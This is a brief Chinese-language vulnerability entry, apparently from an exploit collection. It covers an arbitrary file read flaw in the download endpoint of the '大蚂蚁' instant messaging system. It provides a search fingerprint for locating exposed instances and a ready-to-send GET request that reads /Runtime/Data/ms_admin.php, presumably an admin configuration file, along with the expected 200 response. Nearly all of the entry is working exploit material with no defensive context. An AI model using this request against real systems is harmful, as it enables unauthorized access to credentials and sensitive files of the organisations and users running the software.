# 大蚂蚁即时通信系统download存在任意文件读取漏洞

大蚂蚁即时通信系统 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`product="即时通讯系统"`
- **请求**：`GET /Admin/Public/download.html?a=download&file=/Runtime/Data/ms_admin.php&name=README.txt HTTP/1.1`
- **响应特征**：200